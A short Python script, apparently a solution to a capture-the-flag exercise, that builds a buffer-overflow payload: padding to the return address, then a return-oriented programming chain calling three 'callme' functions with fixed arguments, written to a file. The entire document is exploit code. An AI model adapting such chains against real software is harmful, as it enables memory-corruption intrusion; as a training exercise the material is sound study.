gadget_addr = 0x0040093c

buf_to_rip_offset = 0x28

callme1_springboard = 0x400720
callme2_springboard = 0x400740
callme3_springboard = 0x4006f0

to_write = [gadget_addr,
            0xdeadbeefdeadbeef,
            0xcafebabecafebabe,
            0xd00df00dd00df00d,
            callme1_springboard,

            gadget_addr,
            0xdeadbeefdeadbeef,
            0xcafebabecafebabe,
            0xd00df00dd00df00d,
            callme2_springboard,

            gadget_addr,
            0xdeadbeefdeadbeef,
            0xcafebabecafebabe,
            0xd00df00dd00df00d,
            callme3_springboard]

payload = buf_to_rip_offset * b"x"

for x in to_write:
    payload += x.to_bytes(8, "little")

with open("payload", "wb") as f:
    f.write(payload)
